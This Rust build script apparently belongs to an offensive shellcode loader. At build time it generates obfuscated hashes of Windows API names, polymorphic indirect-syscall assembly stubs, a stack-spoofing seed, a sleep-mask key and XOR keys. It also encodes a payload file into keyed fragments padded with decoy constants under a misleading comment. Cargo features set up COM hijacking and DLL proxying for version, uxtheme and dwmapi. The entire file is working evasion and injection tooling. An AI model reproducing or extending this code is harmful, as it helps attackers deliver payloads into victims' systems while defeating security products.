use std::fs;
use std::path::Path;

const API_NAMES: &[&str] = &[
    "NtSetContextThread",
    "NtGetContextThread",
    "NtProtectVirtualMemory",
    "NtDelayExecution",
    "NtQuerySystemInformation",
    "NtTerminateProcess",
    "NtQueryPerformanceCounter",
    "NtOpenSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtClose",
    "NtQueryInformationProcess",
    "NtWaitForSingleObject",
    "NtOpenProcess",
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtQuerySystemTime",
    "RtlAddVectoredExceptionHandler",
    "RtlRemoveVectoredExceptionHandler",
    "RtlCaptureStackBackTrace",
    "RtlUserThreadStart",
    "GetCurrentThread",
    "GetCursorPos",
    "GetTickCount64",
    "GetLastInputInfo",
    "GetThreadContext",
    "SetThreadContext",
    "QueryUnbiasedInterruptTime",
    "LdrRegisterDllNotification",
    "SuspendThread",
    "ResumeThread",
    "VirtualProtect",
    "GetModuleFileNameW",
    "GetCurrentProcess",
    "GetCurrentThreadId",
    "QueryInterruptTime",
    "QueryInterruptTimePrecise",
    "VirtualAlloc",
    "VirtualFree",
    "MapViewOfFile",
    "UnmapViewOfFile",
    "GetSystemTimePreciseAsFileTime",
    "LdrUnregisterDllNotification",
    "RaiseException",
    "OpenThread",
];

fn main() {
    let out_dir = std::env::var_os("OUT_DIR").unwrap();
    let out_path = Path::new(&out_dir);

    let (seed_lo, seed_hi) = generate_build_seed();

    generate_api_hashes(out_path, seed_lo, seed_hi);

    generate_asm_variants(out_path, seed_lo);

    generate_crypto_config(out_path, seed_lo, seed_hi);

    generate_encoded_payload(out_path, seed_lo, seed_hi);

    println!("cargo:rustc-env=POLY_BUILD_SIG={:04X}", seed_lo as u16);

    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap();
    let def_dir = Path::new(&manifest_dir).join("def");

    if std::env::var("CARGO_FEATURE_COM_HIJACK").is_ok() {
        let def_path = def_dir.join("com.def");
        if def_path.exists() {
            println!("cargo:rustc-cdylib-link-arg=/DEF:{}", def_path.display());
            println!("cargo:rerun-if-changed=def/com.def");
        }
    } else if std::env::var("CARGO_FEATURE_PROXY_VERSION").is_ok() {
        let def_path = def_dir.join("version.def");
        if def_path.exists() {
            println!("cargo:rustc-cdylib-link-arg=/DEF:{}", def_path.display());
            println!("cargo:rerun-if-changed=def/version.def");
        }
    } else if std::env::var("CARGO_FEATURE_PROXY_UXTHEME").is_ok() {
        let def_path = def_dir.join("uxtheme.def");
        if def_path.exists() {
            println!("cargo:rustc-cdylib-link-arg=/DEF:{}", def_path.display());
            println!("cargo:rerun-if-changed=def/uxtheme.def");
        }
    } else if std::env::var("CARGO_FEATURE_PROXY_DWMAPI").is_ok() {
        let def_path = def_dir.join("dwmapi.def");
        if def_path.exists() {
            println!("cargo:rustc-cdylib-link-arg=/DEF:{}", def_path.display());
            println!("cargo:rerun-if-changed=def/dwmapi.def");
        }
    }

    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=Cargo.toml");
    println!("cargo:rerun-if-changed=src/config_payload.rs");
    println!("cargo:rerun-if-changed=src/codec.rs");

    let crypto_fallback1 = seed_lo.rotate_left(13) ^ 0x1234567890ABCDEF;
    let crypto_fallback2 = seed_hi.rotate_right(7) ^ 0xFEDCBA0987654321;
    let stack_spoof_seed = seed_lo.wrapping_add(seed_hi);
    let utils_seed = seed_hi.wrapping_mul(0xDEADBEEFCAFEBABE);
    let sleep_mask_key = seed_lo.rotate_left(7) ^ seed_hi.rotate_right(11) ^ 0xA5A5A5A5A5A5A5A5;

    fs::write(
        out_path.join("crypto_fallback1.in"),
        format!("0x{:016X}_u64", crypto_fallback1),
    )
    .unwrap();
    fs::write(
        out_path.join("crypto_fallback2.in"),
        format!("0x{:016X}_u64", crypto_fallback2),
    )
    .unwrap();
    fs::write(
        out_path.join("stack_spoof_seed.in"),
        format!("0x{:016X}_u64", stack_spoof_seed),
    )
    .unwrap();
    fs::write(
        out_path.join("utils_seed.in"),
        format!("0x{:016X}_u64", utils_seed),
    )
    .unwrap();
    fs::write(
        out_path.join("sleep_mask_key.in"),
        format!("0x{:016X}_u64", sleep_mask_key),
    )
    .unwrap();
}

fn generate_build_seed() -> (u64, u64) {
    let config_path = Path::new("src/config.rs");
    let mut randomization_enabled = true;

    if let Ok(content) = fs::read_to_string(config_path) {
        if content.contains("fn advanced_behavior_randomization() -> bool") {
            if content.contains("#[cfg(not(debug_assertions))]\n    { false }") || 
               content.contains("#[cfg(not(debug_assertions))]\r\n    { false }") {
                   if std::env::var("PROFILE").unwrap_or_default() == "release" {
                       randomization_enabled = false;
                   }
            }
        }
    }
    
    if let Ok(seed_str) = std::env::var("BUILD_SEED") {
        let seed = u64::from_str_radix(&seed_str, 16).unwrap_or(0xDEADBEEFCAFEBABE);
        return (seed, seed.rotate_left(32));
    }

    if !randomization_enabled {
        let seed = 0xDEADBEEFCAFEBABE;
        return (seed, seed.rotate_left(32));
    }

    use std::process;
    use std::time::{SystemTime, UNIX_EPOCH};

    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64;

    let pid = process::id() as u64;

    let seed_lo = now.wrapping_mul(0x9E3779B97F4A7C15) ^ pid;
    let seed_hi = seed_lo.rotate_left(32).wrapping_add(0xDEADBEEFCAFEBABE);

    (seed_lo, seed_hi)
}

fn hash_mix(mut x: u64) -> u64 {
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    x.wrapping_mul(0x2545F4914F6CDD1D)
}

fn derive_hash_mask(key_lo: u64, key_hi: u64, idx: usize) -> u64 {
    let idx_mix = (idx as u64).wrapping_mul(0x9E3779B97F4A7C15);
    let shift = (idx * 7) % 64;
    let combined = key_lo ^ idx_mix.rotate_left(shift as u32);

    let mut x = combined ^ key_hi;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    x.wrapping_mul(0x2545F4914F6CDD1D)
}

fn generate_api_hashes(out_path: &Path, key_lo: u64, key_hi: u64) {
    let salt = hash_mix(key_lo ^ 0xDEADBEEF);

    let custom_fnv_offset = {
        let mut x = key_lo ^ 0xA5A5A5A5A5A5A5A5;
        x = hash_mix(x);
        x | 1
    };

    let custom_fnv_prime = {
        let mut p = key_hi ^ 0x5555555555555555;
        p = hash_mix(p);

        (p | 0x100000001) | 1
    };

    fs::write(
        out_path.join("fnv_offset.in"),
        format!("0x{:016X}_u64", custom_fnv_offset),
    )
    .unwrap();
    fs::write(
        out_path.join("fnv_prime.in"),
        format!("0x{:016X}_u64", custom_fnv_prime),
    )
    .unwrap();

    fs::write(
        out_path.join("hash_salt.in"),
        format!("0x{:016X}_u64", salt),
    )
    .unwrap();

    let tag = hash_mix(salt);
    fs::write(out_path.join("hash_tag.in"), format!("0x{:016X}_u64", tag)).unwrap();

    let mut order_indices: Vec<usize> = (0..API_NAMES.len()).collect();
    {

        let mut shuffle_state = key_lo.wrapping_mul(0x9E3779B97F4A7C15) ^ key_hi;
        for i in (1..order_indices.len()).rev() {

            shuffle_state ^= shuffle_state << 13;
            shuffle_state ^= shuffle_state >> 7;
            shuffle_state ^= shuffle_state << 17;
            let j = (shuffle_state as usize) % (i + 1);
            order_indices.swap(i, j);
        }
    }
    let order_content = format!(
        "[{}]",
        order_indices
            .iter()
            .map(|i| format!("{}", i))
            .collect::<Vec<_>>()
            .join(", ")
    );
    fs::write(out_path.join("generated_order.in"), order_content).unwrap();

    fs::write(
        out_path.join("hash_key.in"),
        format!("(0x{:016X}_u64, 0x{:016X}_u64)", key_lo, key_hi),
    )
    .unwrap();

    let mut hashes = Vec::new();

    for (i, name) in API_NAMES.iter().enumerate() {
        let mut h_val = custom_fnv_offset;
        for &b in name.as_bytes() {
            h_val ^= b as u64;
            h_val = h_val.wrapping_mul(custom_fnv_prime);
        }

        let tag_mix = tag.rotate_left((name.len() as u32) & 31);
        let rt_hash = h_val ^ salt ^ tag_mix;

        let mask = derive_hash_mask(key_lo, key_hi, i);
        hashes.push(rt_hash ^ mask);
    }

    let content = hashes
        .iter()
        .map(|h| format!("0x{:016X}_u64", h))
        .collect::<Vec<_>>()
        .join(", ");
    fs::write(out_path.join("masked_hashes.in"), format!("[{}]", content)).unwrap();
}

fn generate_asm_variants(out_path: &Path, seed_lo: u64) {
    let idx = (seed_lo as usize) % 6;

    let variants = [
        "push rbx\n\
         sub rsp, 0x20\n\
         mov [rsp], {gadget}\n\
         mov r10, rcx\n\
         mov eax, {ssn:e}\n\
         call qword ptr [rsp]\n\
         add rsp, 0x20\n\
         pop rbx",
        "push rbx\n\
         push r12\n\
         sub rsp, 0x28\n\
         mov [rsp], {gadget}\n\
         mov r10, rcx\n\
         mov eax, {ssn:e}\n\
         call qword ptr [rsp]\n\
         add rsp, 0x28\n\
         pop r12\n\
         pop rbx",
        "push rbx\n\
         sub rsp, 0x28\n\
         mov rbx, {gadget}\n\
         mov r10, rcx\n\
         mov eax, {ssn:e}\n\
         call rbx\n\
         add rsp, 0x28\n\
         pop rbx",
        "push r15\n\
         sub rsp, 0x20\n\
         mov r15, {gadget}\n\
         mov r10, rcx\n\
         mov eax, {ssn:e}\n\
         call r15\n\
         add rsp, 0x20\n\
         pop r15",
        "sub rsp, 0x28\n\
          mov r10, rcx\n\
          mov eax, {ssn:e}\n\
          mov r11, {gadget}\n\
          call r11\n\
          add rsp, 0x28",
        "push r13\n\
          sub rsp, 0x20\n\
          mov r13, {gadget}\n\
          mov r10, rcx\n\
          mov eax, {ssn:e}\n\
          call r13\n\
          add rsp, 0x20\n\
          pop r13",
    ];

    let selected_asm = variants[idx];

    fs::write(out_path.join("poly_asm.in"), selected_asm).unwrap();
}

fn generate_crypto_config(out_path: &Path, seed_lo: u64, seed_hi: u64) {
    struct BuildPrng {
        state: u64,
    }

    impl BuildPrng {
        fn new(seed: u64) -> Self {
            Self {
                state: if seed == 0 { 0xDEADBEEFCAFEBABE } else { seed },
            }
        }

        fn next(&mut self) -> u64 {
            let mut x = self.state;
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            self.state = x;
            x
        }

        fn next_u8(&mut self) -> u8 {
            (self.next() & 0xFF) as u8
        }
    }

    let combined_seed = seed_lo.wrapping_mul(0x9E3779B97F4A7C15) ^ seed_hi;
    let mut rng = BuildPrng::new(combined_seed);

    let mut xor_key = [0u8; 32];
    for b in &mut xor_key {
        *b = rng.next_u8();
    }

    let mut xor_key2 = [0u8; 16];
    for b in &mut xor_key2 {
        *b = rng.next_u8();
    }

    let xor_key_str = xor_key
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");
    let xor_key2_str = xor_key2
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    let content = format!(
        "// AUTO-GENERATED BY build.rs - DO NOT EDIT\n\
         // Unique per build \n\n\
         /// Rolling XOR Key 1 (32 bytes)\n\
         pub const XOR_KEY: [u8; 32] = [{xor_key_str}];\n\n\
         /// Rolling XOR Key 2 (16 bytes)\n\
         pub const XOR_KEY2: [u8; 16] = [{xor_key2_str}];\n"
    );

    fs::write(out_path.join("crypto_config.rs"), content)
        .expect("Failed to write crypto_config.rs");
}

fn generate_encoded_payload(out_path: &Path, seed_lo: u64, seed_hi: u64) {
    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap();
    let payload_path = Path::new(&manifest_dir).join("payload.bin");

    let raw = if payload_path.exists() {
        println!("cargo:rerun-if-changed=payload.bin");
        fs::read(&payload_path).expect("Failed to read payload.bin")
    } else {

        let mut sled = vec![0x90u8; 16];
        sled.extend_from_slice(&[0x48, 0x31, 0xC0, 0xC3]);
        sled
    };

    let payload_len = raw.len();

    let mut lfsr_state = seed_lo.wrapping_mul(0x5851F42D4C957F2D) ^ seed_hi;

    let frag_max: usize = if payload_len <= 2048 {
        48
    } else if payload_len <= 20480 {
        128
    } else {
        200
    };

    let num_frags = if payload_len == 0 {
        1
    } else {
        (payload_len + frag_max - 1) / frag_max
    };

    let mut frag_keys: Vec<u64> = Vec::with_capacity(num_frags);
    for _ in 0..num_frags {
        lfsr_state ^= lfsr_state << 13;
        lfsr_state ^= lfsr_state >> 7;
        lfsr_state ^= lfsr_state << 17;
        frag_keys.push(lfsr_state);
    }

    let mut fragments: Vec<Vec<u8>> = Vec::new();
    for (fi, chunk) in raw.chunks(frag_max).enumerate() {
        let key = frag_keys[fi];
        let key_bytes = key.to_le_bytes();
        let encoded: Vec<u8> = chunk
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ key_bytes[i % 8])
            .collect();
        fragments.push(encoded);
    }

    if fragments.is_empty() {
        fragments.push(Vec::new());
    }

    let mut code = String::new();
    code.push_str("// AUTO-GENERATED BY build.rs  DO NOT EDIT\n");
    code.push_str("// Per-build polymorphic payload fragment encoding\n\n");

    code.push_str(&format!("const _FRAG_COUNT: usize = {};\n", num_frags));
    code.push_str(&format!("const _PAYLOAD_LEN: usize = {};\n\n", payload_len));

    let keys_str = frag_keys
        .iter()
        .map(|k| format!("0x{:016X}_u64", k))
        .collect::<Vec<_>>()
        .join(",\n    ");
    code.push_str(&format!(
        "const _FKEYS: [u64; {}] = [\n    {}\n];\n\n",
        num_frags, keys_str
    ));

    for (i, frag) in fragments.iter().enumerate() {
        let bytes_str = frag
            .iter()
            .map(|b| format!("0x{:02X}", b))
            .collect::<Vec<_>>()
            .join(", ");
        code.push_str(&format!(
            "const _S{}: [u8; {}] = [{}];\n",
            i,
            frag.len(),
            bytes_str
        ));
    }

    code.push('\n');

    let refs_str = (0..num_frags)
        .map(|i| format!("&_S{}", i))
        .collect::<Vec<_>>()
        .join(", ");
    code.push_str(&format!(
        "const _SREF: [&[u8]; {}] = [{}];\n\n",
        num_frags, refs_str
    ));

    let mut pad_state = seed_hi ^ 0xC6A4A7935BD1E995;
    let pad_len: usize = if payload_len <= 2048 {
        256
    } else if payload_len <= 20480 {
        (payload_len / 8).max(256)
    } else {
        (payload_len / 6).max(2048)
    };
    let pad_bytes: Vec<u8> = (0..pad_len)
        .map(|_| {

            pad_state ^= pad_state << 13;
            pad_state ^= pad_state >> 7;
            pad_state ^= pad_state << 17;

            let r = (pad_state >> 32) as u8;
            if r < 200 { r & 0x03 } else if r < 240 { (r & 0x07) | 0x04 } else { r & 0x0F }
        })
        .collect();
    code.push_str("// Module compatibility matrix used by hash resolver\n");

    let dilution_chunk_size = 128;
    let dilution_chunks = (pad_bytes.len() + dilution_chunk_size - 1) / dilution_chunk_size;
    for (ci, chunk) in pad_bytes.chunks(dilution_chunk_size).enumerate() {
        let chunk_str = chunk
            .iter()
            .map(|b| format!("0x{:02X}", b))
            .collect::<Vec<_>>()
            .join(", ");
        code.push_str(&format!(
            "#[allow(dead_code)]\nconst _CT{}: [u8; {}] = [{}];\n",
            ci,
            chunk.len(),
            chunk_str
        ));
    }
    let _ = dilution_chunks;

    fs::write(out_path.join("payload_encoded.rs"), code)
        .expect("Failed to write payload_encoded.rs");
}

